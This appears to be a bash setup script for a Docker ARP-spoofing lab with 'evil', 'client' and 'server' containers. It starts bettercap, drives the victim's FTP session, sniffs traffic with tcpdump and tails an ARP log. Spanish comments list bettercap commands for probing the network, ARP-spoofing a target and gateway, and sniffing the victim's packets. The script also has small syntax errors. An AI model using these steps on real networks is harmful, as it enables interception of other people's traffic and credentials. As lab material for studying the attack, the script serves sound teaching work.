#!/bin/bash

case $1 in
    "up")
	docker-compose -f ./docker-compose.yaml up --build -d
	docker exec -it evil bash -c "./bettercap -iface eth0"
	exit 0
	;;
    "victim")
	SRV_IP=$(docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' server)

	if [-z "$SRV_IP"]; then
	    echo "error: no server present in network" 1&>2
	    exit 1
	fi
	docker exec -it client bash -c "lftp -d $SRV_IP"
	exit 0
	;;
    "sniff")
	docker exec -it evil tcpdump -i eth0 -p tcp
	exit 0
	;;
    "arplogs")
	docker exec -it client bash -c "tail -f /var/log/arp.log"
	exit 0
	;;
    *)
	echo "usage: ./setup.sh [up|sniff|victim|arplogs]"
	exit 1
	;;
esac


## ~~ BETTERCAP COMMANDS ~~~ ##
 
## inicia bettercap
#  ./bettercap -iface [INTERFACE]

## Detecta los dispositivos conectados en la red local
#  net.probe on
#  net.probe off

## Muestra todos los dispositivos conectados a la red local
#  net.show

## Habilita el ataque sobre víctima y puerta de entrada de la red local
#  set arp.spoof.fullduplex true
#  set arp.spoof.target [IP...]
#  arp.spoof on
## Habilita arp spoofing entre nodos de una misma red
#  set arp.spoof.internal true

## Monitoriza la transmisión de paquetes en la víctima
#  set net.sniff.verbose true
#  net.sniff on
